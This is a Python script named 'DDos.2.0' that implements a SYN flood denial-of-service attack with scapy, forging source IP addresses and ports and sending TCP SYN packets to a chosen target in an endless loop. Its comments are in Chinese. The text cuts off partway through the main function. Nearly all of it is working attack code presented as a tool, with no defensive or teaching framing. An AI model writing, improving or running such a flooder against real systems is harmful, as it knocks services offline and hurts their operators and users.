"""
========================================
Name:DDos.2.0  Author: Lalevin Martin
 Mailbox: zzlyxht@outlook.com                                                
 Github: http://github.com/nacglalevin
Written in 2023-11-8
==================NACG==================
"""
import random
import sys
import socket
from scapy.all import *

class SynFlood(object):
    def __init__(self):
        self.targetIP = ''
        self.targetPort = 0
        self.srcList = []

    # 构造伪造的源IP地址
    def randIP(self):
        # 随机生成IP地址，预设为192.168.1.x
        x = random.randint(0, 255)

        return '192.168.1.' + str(x)

    # 构造伪造的源端口号
    def randPort(self):
        # 随机生成端口号
        return random.randint(1024, 65535)

    # 伪造源IP地址和源端口号，发送SYN包
    def synFlood(self):
        # 构造IP数据包
        ipPacket = IP()
        ipPacket.src = self.randIP()
        ipPacket.dst = self.targetIP

        # 构造TCP数据包
        tcpPacket = TCP()
        tcpPacket.sport = self.randPort()
        tcpPacket.dport = self.targetPort
        tcpPacket.flags = 'S'

        # 发送SYN包
        packet = ipPacket / tcpPacket
        send(packet)

    # 发送SYN包的入口函数
    def run(self):
        print('开始SYN攻击...')

        # 循环发送SYN包
        while True:
            self.synFlood()

# 主函数
def main():
    # 创建SYN攻击对象
    synf